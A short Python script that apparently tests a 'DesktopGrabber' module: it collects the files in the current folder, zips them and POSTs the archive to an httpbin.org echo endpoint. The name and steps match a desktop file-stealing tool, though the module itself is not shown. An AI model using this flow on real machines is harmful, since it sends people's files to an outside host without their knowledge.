from DesktopGrabber import *

if __name__ == "__main__":
    url = "http://httpbin.org/post"
    agent = DeskGrab("Test", "123")
    files = agent._dirTraversel(".")
    create_zip_bool = agent._createZip(files)
    print(create_zip_bool)
    send_package = agent._sendPackage(url)




